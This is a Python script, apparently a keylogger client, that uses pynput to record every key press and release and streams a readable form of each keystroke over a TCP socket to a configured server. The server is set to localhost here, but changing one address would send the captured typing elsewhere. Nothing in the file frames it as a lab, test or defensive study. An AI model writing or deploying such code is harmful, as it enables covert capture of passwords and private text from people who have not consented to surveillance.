import socket
from pynput.keyboard import Key, Listener

# Server Connection Configuration
SERVER_HOST = '127.0.0.1'  # Server IP address
SERVER_PORT = 65432

# Connect to Server
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_HOST, SERVER_PORT))

def send_key_event(event_type, key):
    """Sends key event to the server."""
    try:
        # Prepare readable representation of key
        if hasattr(key, 'char') and key.char:
            message = f"{event_type}: '{key.char}'"
        else:
            special_keys = {
                Key.space: "Space",
                Key.enter: "Enter",
                Key.backspace: "Backspace",
                Key.tab: "Tab",
                Key.shift: "Shift",
                Key.ctrl_l: "Left Control",
                Key.ctrl_r: "Right Control",
                Key.alt_l: "Left Alt",
                Key.alt_r: "Right Alt",
                Key.caps_lock: "Caps Lock",
                Key.esc: "Escape",
                Key.up: "Up Arrow",
                Key.down: "Down Arrow",
                Key.left: "Left Arrow",
                Key.right: "Right Arrow"
            }
            key_name = special_keys.get(key, str(key))
            message = f"{event_type}: [{key_name}]"
        
        # Send the message to the server
        client_socket.sendall(message.encode('utf-8'))
    except Exception as e:
        print(f"Error sending key event: {e}")

def on_press(key):
    send_key_event("Pressed", key)

def on_release(key):
    send_key_event("Released", key)
    if key == Key.esc:  # Stop key to end client
        client_socket.close()
        return False

# Start listening to keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
